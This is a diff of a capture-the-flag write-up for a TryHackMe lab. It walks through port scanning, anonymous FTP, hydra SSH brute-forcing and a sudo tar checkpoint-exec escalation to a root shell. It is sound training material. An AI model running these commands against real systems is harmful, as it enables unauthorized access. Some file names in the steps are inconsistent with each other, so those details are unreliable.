@@ -16,17 +16,9 @@ You were boasting on and on about your elite hacker skills in the bar and a few 
 # Steps
 1 - Join the room, start the virtual machine and the AttackBox (or connect via VPN)
 
-2 - Find open ports on the machine
+2 - Find open ports on the machine, the nmap output will show three open ports:
 * ```# nmap <ip-virtual-machine>```
-
-
-
-* After nmap is finished scanning, our output shows three open ports:
-```
-21 | ftp
-22 | ssh
-80 | http
-```
+<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/cowboyhacker/cowboyhacker2.png" width="30%">
 
 3 - Who wrote the task list?
 * Access the ftp of the virtual machine with ```anonymous``` user
@@ -44,6 +36,7 @@ You were boasting on and on about your elite hacker skills in the bar and a few 
 5 - What is the users password? 
 * Use hydra with the locks.txt file to bruteforce the ssh user and pasword
 * ```# hydra -l lin -P /root/task.txt <ip-virtual-machine> ssh```
+<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/cowboyhacker/cowboyhacker3.png" width="50%">
 
 6 - user.txt
 * With the result of hydra login in to the virtual machine via ssh and get the flag of the ```user.txt```
@@ -54,4 +47,6 @@ You were boasting on and on about your elite hacker skills in the bar and a few 
 * ```# sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
 * Search the root.txt file
 * ```# find / -name flag.txt 2>/dev/null```
+<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/images/cowboyhacker/cowboyhacker4.png" width="25%">
+
 * Get the flag
